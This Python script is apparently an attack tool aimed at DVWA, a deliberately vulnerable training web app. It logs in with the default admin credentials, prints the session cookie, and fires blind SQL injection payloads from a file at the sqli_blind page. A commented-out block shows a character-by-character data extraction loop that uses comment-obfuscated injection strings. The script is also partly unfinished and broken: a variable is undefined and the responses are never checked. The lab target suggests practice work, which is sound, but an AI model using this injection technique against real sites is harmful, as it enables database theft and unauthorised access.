import requests
import re
import sys

def login(rhost):
    s = requests.session()
    login_url = "http://{}/login.php".format(rhost)
    req = s.get(login_url)
    match = re.search(r'([a-z,0-9]){32}', req.text)
    token = match.group(0)
    data = {'username':'admin','password':'password','Login':'Login','user_token':token}
    login = s.post(login_url, data=data)
    if "Welcome" in login.text:
        print("login successful")
        print("admin cookie: {}".format(s.cookies["PHPSESSID"]))
    return s


def Sqli(rhost, session_object):
    extracted_data = ""
    # for index in range(1,33):
    #     for i in range(32, 126):
    #         query = "7'/**/or/**/(SELECT/**/ascii(substring(({}),{},1)))={}/**/%23".format(my_query.replace(" ", "/**/"),index,i)
    #         r = session_object.get("http://{}/vulnerabilities/sqli_blind/?id={}&Submit=Submit#".format(rhost,query))
    #         if "User ID exists" in r.text:
    #             extracted_data += chr(i)
    #             sys.stdout.write(chr(i))
                # sys.stdout.flush()
    with open("sql.txt","r") as f:
        for i in f.readlines():
            r = session_object.get("http://"+rhost+f"/vulnerabilities/sqli_blind/?id={i}&Submit=Submit#")
            # if "User ID exists" in r.text:
            # print("sql/ attack")
            # print("http://"+rhost+f"/vulnerabilities/sqli_blind/?id={i}&Submit=Submit#")
    return session_object

def main():
    rhost = sys.argv[1]
    sess = login(rhost)
    sess = Sqli(rhost, sess)
    print("")
    # print("The query result is: {}".format(extracted_data))
        
if __name__ == "__main__":
    main()
